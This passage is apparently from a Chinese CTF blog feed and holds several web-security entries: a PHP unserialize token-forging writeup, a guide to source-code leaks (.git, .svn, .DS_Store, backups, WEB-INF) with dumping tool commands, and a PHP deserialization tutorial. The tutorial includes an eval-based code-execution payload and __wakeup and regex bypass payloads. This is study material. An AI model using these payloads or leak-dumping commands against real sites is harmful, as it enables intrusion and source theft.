operator">-</span><span class="token operator">></span><span class="token property">where</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">function</span> <span class="token function">select</span><span class="token punctuation">(</span><span class="token variable">$where</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token string">'select * from user where '</span><span class="token punctuation">.</span><span class="token variable">$where</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> @<span class="token function">mysql_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$requset</span><span class="token punctuation">[</span><span class="token string">'token'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$login</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">gzuncompress</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$requset</span><span class="token punctuation">[</span><span class="token string">'token'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$db</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">db</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">select</span><span class="token punctuation">(</span><span class="token string">'user=\''</span><span class="token punctuation">.</span><span class="token function">mysql_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$login</span><span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'\''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$login</span><span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string">'ichunqiu'</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">'pass'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token variable">$login</span><span class="token punctuation">[</span><span class="token string">'pass'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string">'unserialize injection!!'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string">"(â¯âµâ¡â²)â¯ï¸µâ´ââ´ "</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'Location: index.php?error=1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token operator">?</span></code></pre><p>得知要得到flag需要满足 $login[‘user’] === ‘ichunqiu’</p><p>而user被$login = unserialize(gzuncompress(base64_decode($requset[‘token’])));处理过</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'user'</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">'ichunqiu'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">gzcompress</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>得到<code>eJxLtDK0qi62MrFSKi1OLVKyLraysFLKTM4ozSvMLFWyrgUAo4oKXA==</code><br>抓包将cookie中加一个<code>token=eJxLtDK0qi62MrFSKi1OLVKyLraysFLKTM4ozSvMLFWyrgUAo4oKXA==</code><br>有一点很头疼，为啥直接在get请求中加不行么,一定要token中</p>]]></content>
      
      
      <categories>
          
          <category> 弃燕雀之小志-慕鸿鹄以高翔 </category>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>源码泄露</title>
      <link href="/2019/07/20/yuan-ma-xie-lu/"/>
      <url>/2019/07/20/yuan-ma-xie-lu/</url>
      
        <content type="html"><![CDATA[<h3 id="文件源码泄露"><a href="#文件源码泄露" class="headerlink" title="文件源码泄露"></a>文件源码泄露</h3><p>首先通过dirsearch看一下是否是泄露<br><a href="https://github.com/maurosoria/dirsearch" target="_blank" rel="noopener">https://github.com/maurosoria/dirsearch</a></p><h5 id="1、hg-源码泄露-¶"><a href="#1、hg-源码泄露-¶" class="headerlink" title="1、hg 源码泄露 ¶"></a>1、hg 源码泄露 <a href="https://ctf-wiki.github.io/ctf-wiki/web/php/php-zh/#hg" target="_blank" rel="noopener">¶</a></h5><p><code>hg init</code> 时会产生 <code>.hg</code> 文件。</p><p><a href="https://github.com/kost/dvcs-ripper" target="_blank" rel="noopener">利用工具 dvcs-ripper</a></p><h5 id="2、Git-源码泄露-¶"><a href="#2、Git-源码泄露-¶" class="headerlink" title="2、Git 源码泄露 ¶"></a>2、Git 源码泄露 <a href="https://ctf-wiki.github.io/ctf-wiki/web/php/php-zh/#git" target="_blank" rel="noopener">¶</a></h5><p><code>.git</code> 目录内有代码的变更记录等文件，如果部署时该目录下的文件可被访问，可能会被利用来恢复源代码。</p><pre><code>/.git/.git/HEAD/.git/index/.git/config/.git/description</code></pre><p>貌似这两个脚本只能在linux下跑？我win10本地不行<br><a href="https://github.com/lijiejie/GitHack" target="_blank" rel="noopener">python2-GitHack</a></p><pre><code>python GitHack.py http://www.openssl.org/.git/</code></pre><p><a href="https://github.com/WangYihang/GitHacker" target="_blank" rel="noopener">python2-GitHacker（可恢复完整 Git 仓库）</a></p><pre><code>python GitHacker.py http://www.openssl.org/.git/</code></pre><p><a href="https://github.com/gakki429/Git_Extract" target="_blank" rel="noopener">python2-https://github.com/gakki429/Git_Extract</a></p><pre><code>$ python git_extract.py http://example.com/.git/ 一个存在 .git 泄露的网站$ python git_extract.py example/.git/ 一个本地的 .git 路径</code></pre><p>例题jarvios的babyphp</p><h5 id="3、-DS-Store-文件泄露-¶"><a href="#3、-DS-Store-文件泄露-¶" class="headerlink" title="3、.DS_Store 文件泄露 ¶"></a>3、<code>.DS_Store</code> 文件泄露 <a href="https://ctf-wiki.github.io/ctf-wiki/web/php/php-zh/#ds_store" target="_blank" rel="noopener">¶</a></h5><p>Mac OS 中会包含有 <code>.DS_Store</code> 文件，包含文件名等信息。</p><p><a href="https://github.com/lijiejie/ds_store_exp" target="_blank" rel="noopener">利用工具 ds＿store＿exp</a><br>例题bugku ctf sql注入2</p><h5 id="4、网站备份文件-¶"><a href="#4、网站备份文件-¶" class="headerlink" title="4、网站备份文件 ¶"></a>4、网站备份文件 <a href="https://ctf-wiki.github.io/ctf-wiki/web/php/php-zh/#_20" target="_blank" rel="noopener">¶</a></h5><p>管理员备份网站文件后错误地将备份放在 Web 目录下。</p><p>常见的后缀名：</p><pre><code>.rar.zip.7z.tar.tar.gz.bak.txt</code></pre><h5 id="5、SVN-泄露-¶"><a href="#5、SVN-泄露-¶" class="headerlink" title="5、SVN 泄露 ¶"></a>5、SVN 泄露 <a href="https://ctf-wiki.github.io/ctf-wiki/web/php/php-zh/#svn" target="_blank" rel="noopener">¶</a></h5><p>敏感文件：</p><pre><code>/.svn/.svn/wc.db/.svn/entries</code></pre><p><a href="https://github.com/admintony/svnExploit" target="_blank" rel="noopener">https://github.com/admintony/svnExploit</a><br>检测SVN源代码泄露</p><pre><code>python SvnExploit.py -u http://192.168.27.128/.svn</code></pre><p>下载源代码</p><pre><code>python SvnExploit.py -u http://192.168.27.128/.svn --dump</code></pre><h5 id="6、WEB-INF-web-xml-泄露-¶"><a href="#6、WEB-INF-web-xml-泄露-¶" class="headerlink" title="6、WEB-INF / web.xml 泄露 ¶"></a>6、WEB-INF / web.xml 泄露 <a href="https://ctf-wiki.github.io/ctf-wiki/web/php/php-zh/#web-inf-webxml" target="_blank" rel="noopener">¶</a></h5><p>WEB-INF 是 Java Web 应用的安全目录，web.xml 中有文件的映射关系。</p><p>WEB-INF 主要包含一下文件或目录：</p><ul><li><code>/WEB-INF/web.xml</code> ：Web 应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。</li><li><code>/WEB-INF/classes/</code> ：含了站点所有用的 class 文件，包括 servlet class 和非 servlet class，他们不能包含在。jar 文件中。</li><li><code>/WEB-INF/lib/</code> ：存放 web 应用需要的各种 JAR 文件，放置仅在这个应用中要求使用的 jar 文件，如数据库驱动 jar 文件。</li><li><code>/WEB-INF/src/</code> ：源码目录，按照包名结构放置各个 java 文件。</li><li><code>/WEB-INF/database.properties</code> ：数据库配置文件。</li></ul><p>通过找到 web.xml 文件，推断 class 文件的路径，最后直接 class 文件，在通过反编译 class 文件，得到网站源码。 一般情况，jsp 引擎默认都是禁止访问 WEB-INF 目录的，Nginx 配合 Tomcat 做均衡负载或集群等情况时，问题原因其实很简单，Nginx 不会去考虑配置其他类型引擎（Nginx 不是 jsp 引擎）导致的安全问题而引入到自身的安全规范中来（这样耦合性太高了），修改 Nginx 配置文件禁止访问 WEB-INF 目录就好了：</p><pre><code>location ~ ^/WEB-INF/* { deny all; } # 或者return 404; 或者其他！</code></pre><h5 id="7、CVS-泄露-¶"><a href="#7、CVS-泄露-¶" class="headerlink" title="7、CVS 泄露 ¶"></a>7、CVS 泄露 <a href="https://ctf-wiki.github.io/ctf-wiki/web/php/php-zh/#cvs" target="_blank" rel="noopener">¶</a></h5><pre><code>http://url/CVS/Root 返回根信息http://url/CVS/Entries 返回所有文件的结构</code></pre><p>取回源码</p><pre><code>bk clone http://url/name dir</code></pre><h5 id="8、-swp文件"><a href="#8、-swp文件" class="headerlink" title="8、.swp文件"></a>8、.swp文件</h5><p>关于swp文件<br>使用vi，经常可以看到swp这个文件,那这个文件是怎么产生的呢，当你打开一个文件，vi就会生成这么一个.(filename)swp文件以备不测（不测下面讨论），如果你正常退出，那么这个这个swp文件将会自动删除。下面说不测。<br>直接访问<code>.submit.php.swp</code>即可</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php反序列化漏洞</title>
      <link href="/2019/07/20/php-fan-xu-lie-hua-lou-dong/"/>
      <url>/2019/07/20/php-fan-xu-lie-hua-lou-dong/</url>
      
        <content type="html"><![CDATA[<h3 id="一、反序列化漏洞"><a href="#一、反序列化漏洞" class="headerlink" title="一、反序列化漏洞"></a>一、反序列化漏洞</h3><h4 id="serialize-，unserialize-这两个函数"><a href="#serialize-，unserialize-这两个函数" class="headerlink" title="serialize()，unserialize()这两个函数"></a>serialize()，unserialize()这两个函数</h4><p>说一说序列化和反序列化的，序列化说通俗点就是把一个对象变成可以传输的字符串。比如一个类class,在内存中是一个类，但是要持久化或者进行传输，就需要序列化，意思其实就是把类存储起来而已。</p><h5 id="demo1-类的序列化"><a href="#demo1-类的序列化" class="headerlink" title="demo1:类的序列化"></a>demo1:类的序列化</h5><a id="more"></a><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">Car</span><span class="token punctuation">{</span>    <span class="token keyword">var</span> <span class="token variable">$size</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> <span class="token variable">$color</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">Car</span><span class="token punctuation">(</span><span class="token variable">$size</span><span class="token operator">=</span><span class="token string">"big"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">size</span><span class="token operator">=</span><span class="token variable">$size</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">what_size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">size</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$mycar</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Car</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$mycar</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">color</span><span class="token operator">=</span><span class="token string">"green"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$mycar</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$mycar</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>输出</p><pre><code>object(Car)#1 (2) { [&quot;size&quot;]=&gt; string(3) &quot;big&quot; [&quot;color&quot;]=&gt; string(5) &quot;green&quot; }O:3:&quot;Car&quot;:2:{s:4:&quot;size&quot;;s:3:&quot;big&quot;;s:5:&quot;color&quot;;s:5:&quot;green&quot;;}</code></pre><p>其实我觉得序列化和var_dump功能类似吧，反正就是不能有<br>，反序列化即把字符串<code>O:3:&quot;Car&quot;:2:{s:4:&quot;size&quot;;s:3:&quot;big&quot;;s:5:&quot;color&quot;;s:5:&quot;green&quot;;}</code>转为类，但是如果是类，需要先定义类</p><h5 id="demo2-类的反序列化"><a href="#demo2-类的反序列化" class="headerlink" title="demo2:类的反序列化"></a>demo2:类的反序列化</h5><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token shell-comment comment">#类反序列化</span><span class="token keyword">class</span> <span class="token class-name">kitty</span><span class="token punctuation">{</span>    <span class="token keyword">var</span> <span class="token variable">$age</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">Car</span><span class="token punctuation">(</span><span class="token variable">$age</span><span class="token operator">=</span><span class="token string">"18"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">size</span><span class="token operator">=</span><span class="token variable">$size</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$seriStr</span><span class="token operator">=</span><span class="token string">'O:5:"kitty":1:{s:3:"age";s:2:"18";}'</span><span class="token punctuation">;</span><span class="token variable">$new_me</span><span class="token operator">=</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$seriStr</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$new_me</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$new_me</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">age</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>输出</p><pre><code>object(kitty)#2 (1) { [&quot;age&quot;]=&gt; string(2) &quot;18&quot; }18</code></pre><h5 id="demo3-数组的序列化和反序列化"><a href="#demo3-数组的序列化和反序列化" class="headerlink" title="demo3:数组的序列化和反序列化"></a>demo3:数组的序列化和反序列化</h5><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token shell-comment comment">#数组序列化</span><span class="token variable">$data</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'php'</span><span class="token punctuation">,</span><span class="token string">'java'</span><span class="token punctuation">,</span><span class="token number">123</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token shell-comment comment">#数组反序列化</span><span class="token variable">$new_ar</span><span class="token operator">=</span><span class="token string">'a:3:{i:0;s:5:"kitty";i:1;s:4:"java";i:2;s:6:"python";}'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$new_ar</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$new_ar</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>输出</p><pre><code>a:3:{i:0;s:3:&quot;php&quot;;i:1;s:4:&quot;java&quot;;i:2;i:123;}array(3) { [0]=&gt; string(5) &quot;kitty&quot; [1]=&gt; string(4) &quot;java&quot; [2]=&gt; string(6) &quot;python&quot; }kitty</code></pre><p>语法规则<br><img src="1.png" alt=""></p><h3 id="二、反序列化漏洞产生"><a href="#二、反序列化漏洞产生" class="headerlink" title="二、反序列化漏洞产生"></a>二、反序列化漏洞产生</h3><p>其实还是一个变量覆盖的问题吧，我们传入的字符串反序列化，导致控制参数或者任意代码执行<br><img src="2.png" alt=""></p><h5 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h5><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">Example</span> <span class="token punctuation">{</span>  <span class="token keyword">var</span> <span class="token variable">$var</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>  <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token keyword">var</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"saved_code"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>payload<code>http://localhost/ser.php?saved_code=O:7:%22Example%22:1:{s:3:%22var%22;s:10:%22phpinfo();%22;}</code></p><h5 id="jarvios例题："><a href="#jarvios例题：" class="headerlink" title="jarvios例题："></a>jarvios例题：</h5><p>源码泄露给了两个文件<br>index.php</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>     <span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string">'shield.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$x</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Shield</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'class'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$g</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'class'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$g</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$x</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$g</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">echo</span> <span class="token variable">$x</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">readfile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>shield.php</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">//flag is in pctf.php</span><span class="token keyword">class</span> <span class="token class-name">Shield</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span> <span class="token operator">-</span><span class="token operator">></span> file <span class="token operator">=</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">readfile</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token punctuation">,</span><span class="token string">'..'</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token constant">FALSE</span>          <span class="token operator">&amp;&amp;</span> <span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token punctuation">,</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token constant">FALSE</span> <span class="token operator">&amp;&amp;</span> <span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token punctuation">,</span><span class="token string">'\\'</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token constant">FALSE</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> @<span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>这里我们可以看见只要操控$file这个参数为pctf.php就可以了，这里construct函数在实例被创建的时候(也就是new Shield()的时候)执行，所以不会影响我们对$file的操作<br>payload<code>O:6:&quot;Shield&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;pctf.php&quot;;}</code></p><h4 id="“百度杯”CTF比赛-十月场-Hash"><a href="#“百度杯”CTF比赛-十月场-Hash" class="headerlink" title="“百度杯”CTF比赛 十月场 Hash"></a>“百度杯”CTF比赛 十月场 Hash</h4><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">Demo</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token string">'Gu3ss_m3_h2h2.php'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> @<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span> <span class="token operator">!=</span> <span class="token string">'Gu3ss_m3_h2h2.php'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//the secret is in the f15g_1s_here.php</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span> <span class="token operator">=</span> <span class="token string">'Gu3ss_m3_h2h2.php'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'var'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$var</span> <span class="token operator">=</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'var'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/[oc]:\d+:/i'</span><span class="token punctuation">,</span> <span class="token variable">$var</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'stop hacking!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        @<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$var</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string">"Gu3ss_m3_h2h2.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>payload</p><pre><code>&lt;?php&lt;?phpclass Demo {    private $file = &#39;Gu3ss_m3_h2h2.php&#39;;        public function __construct($file) {        $this-&gt;file = $file;    }}$a = new Demo(&#39;f15g_1s_here.php&#39;);$s = serialize($a);echo $s;echo &quot;\n&quot;;$s = str_replace(&#39;O:4&#39;, &#39;O:+4&#39;,$s);//绕过正则$s = str_replace(&#39;:1:&#39;, &#39;:2:&#39; ,$s);//绕过wakeup函数echo $s;echo &quot;\n&quot;;echo base64_encode($s);//TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czoxNjoiZjE1Z18xc19oZXJlLnBocCI7fQ==</code></pre>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP命令注入</title>
      <link href="/2019/07/13/php-ming-ling-zhu-ru/"/>
      <url>/2019/07/13/php-ming-ling-zhu-ru/</url>
      
